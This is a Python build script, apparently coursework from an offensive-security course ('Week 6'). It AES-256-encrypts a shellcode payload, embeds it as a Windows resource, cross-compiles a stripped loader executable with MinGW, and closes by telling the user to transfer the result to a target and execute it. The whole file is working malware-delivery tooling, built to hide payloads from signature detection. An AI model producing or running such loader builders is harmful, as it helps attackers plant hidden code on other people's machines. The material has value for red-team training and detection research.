#!/usr/bin/env python3
"""
builder.py - Week 6: AES-256 Encrypted Shellcode Loader Builder

Usage:
    python3 builder.py payload.bin              # Build with default output name
    python3 builder.py payload.bin -o agent.exe # Custom output name
"""

import subprocess
import argparse
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║     🔴 Shellcode Loader Builder       ║
    ║      Week 6 - AES-256 Encryption      ║
    ╚═══════════════════════════════════════╝
    """)

def aes_encrypt(data, key, iv):
    """AES-256-CBC encrypt data with PKCS7 padding"""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)  # PKCS7 padding to 16-byte blocks
    return cipher.encrypt(padded_data)

def bytes_to_c_array(data, name):
    """Convert bytes to a C array declaration"""
    hex_values = ", ".join(f"0x{b:02x}" for b in data)
    return f"unsigned char {name}[] = {{ {hex_values} }};\n"

def generate_key_header(key, iv):
    """Generate key.h with the AES key and IV as C byte arrays"""
    header = "#ifndef KEY_H\n#define KEY_H\n\n"
    header += f"// AES-256 Key ({len(key)} bytes)\n"
    header += bytes_to_c_array(key, "aes_key")
    header += f"\n// AES-CBC IV ({len(iv)} bytes)\n"
    header += bytes_to_c_array(iv, "aes_iv")
    header += f"\n#endif // KEY_H\n"
    return header

def check_file_exists(filepath):
    """Check if a file exists"""
    if not os.path.isfile(filepath):
        print(f"[!] Error: File not found: {filepath}")
        sys.exit(1)
    return True

def compile_resource(resource_file="resource.rc", output="resource.o"):
    """Compile the resource script using windres"""
    print(f"[*] Compiling resource: {resource_file} → {output}")
    
    try:
        result = subprocess.run(
            ["x86_64-w64-mingw32-windres", resource_file, "-o", output],
            capture_output=True,
            text=True,
            check=True
        )
        print(f"[+] Resource compiled successfully!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] windres failed: {e.stderr}")
        return False
    except FileNotFoundError:
        print("[!] Error: x86_64-w64-mingw32-windres not found. Is MinGW installed?")
        return False

def compile_loader(loader_file="loader.c", resource_obj="resource.o", output="loader.exe"):
    """Compile the loader with the resource object and AES library"""
    print(f"[*] Compiling loader: {loader_file} + aes.c + {resource_obj} → {output}")
    
    try:
        result = subprocess.run(
            ["x86_64-w64-mingw32-gcc", loader_file, "aes.c", resource_obj,
             "-o", output, "-s"],
            capture_output=True,
            text=True,
            check=True
        )
        print(f"[+] Loader compiled successfully!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] gcc failed: {e.stderr}")
        return False
    except FileNotFoundError:
        print("[!] Error: x86_64-w64-mingw32-gcc not found. Is MinGW installed?")
        return False

def get_file_size(filepath):
    """Get file size in human readable format"""
    size = os.path.getsize(filepath)
    if size < 1024:
        return f"{size} bytes"
    elif size < 1024 * 1024:
        return f"{size / 1024:.1f} KB"
    else:
        return f"{size / (1024 * 1024):.1f} MB"

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="Build shellcode loader from payload.bin")
    parser.add_argument("payload", help="Path to shellcode file (e.g., payload.bin)")
    parser.add_argument("-o", "--output", default="loader.exe", help="Output executable name")
    parser.add_argument("-c", "--loader", default="loader.c", help="Loader C source file")
    parser.add_argument("--keep", action="store_true", help="Keep intermediate files (.o, key.h)")
    
    args = parser.parse_args()
    
    # Check required files exist
    print("[*] Checking required files...")
    check_file_exists(args.payload)
    check_file_exists(args.loader)
    check_file_exists("resource.rc")
    check_file_exists("resource.h")
    check_file_exists("aes.c")
    check_file_exists("aes.h")
    print(f"[+] Payload size: {get_file_size(args.payload)}")
    
    # Step 1: Generate random AES-256 key (32 bytes) and IV (16 bytes)
    aes_key = os.urandom(32)  # 256-bit key
    aes_iv = os.urandom(16)   # 128-bit IV
    print(f"[*] Generated AES-256 key: {aes_key.hex()}")
    print(f"[*] Generated AES-CBC  IV: {aes_iv.hex()}")
    
    # Step 2: Read and encrypt the payload
    with open(args.payload, "rb") as f:
        raw_payload = f.read()
    
    original_size = len(raw_payload)
    encrypted_payload = aes_encrypt(raw_payload, aes_key, aes_iv)
    print(f"[+] Payload encrypted: {original_size} → {len(encrypted_payload)} bytes (PKCS7 padded)")
    
    # Step 3: Save encrypted payload
    enc_payload_path = "payload_enc.bin"
    with open(enc_payload_path, "wb") as f:
        f.write(encrypted_payload)
    print(f"[+] Encrypted payload saved to {enc_payload_path}")
    
    # Step 4: Generate key.h with key and IV
    key_header = generate_key_header(aes_key, aes_iv)
    with open("key.h", "w") as f:
        f.write(key_header)
    print("[+] Generated key.h with AES key and IV")
    
    # Step 5: Update resource.rc to point to encrypted payload
    with open("resource.rc", "w") as f:
        f.write('#include "resource.h"\n\n')
        f.write(f'IDR_PAYLOAD RCDATA "{enc_payload_path}"\n')
    
    # Step 6: Compile resource
    if not compile_resource():
        sys.exit(1)
    
    # Step 7: Compile loader with AES library
    if not compile_loader(args.loader, "resource.o", args.output):
        sys.exit(1)
    
    # Cleanup intermediate files
    cleanup_files = ["resource.o", enc_payload_path, "key.h"]
    if not args.keep:
        for f in cleanup_files:
            if os.path.exists(f):
                os.remove(f)
        print("[*] Cleaned up intermediate files")
    
    # Restore original resource.rc
    with open("resource.rc", "w") as f:
        f.write('#include "resource.h"\n\n')
        f.write('IDR_PAYLOAD RCDATA "payload.bin"\n')
    
    # Done!
    print("\n" + "=" * 50)
    print(f"[✓] Build complete: {args.output}")
    print(f"[✓] Size: {get_file_size(args.output)}")
    print(f"[✓] Encryption: AES-256-CBC")
    print(f"[✓] Original payload: {original_size} bytes")
    print(f"[✓] Encrypted payload: {len(encrypted_payload)} bytes")
    print("=" * 50)
    print(f"\n[*] Transfer {args.output} to target and execute!")

if __name__ == "__main__":
    main()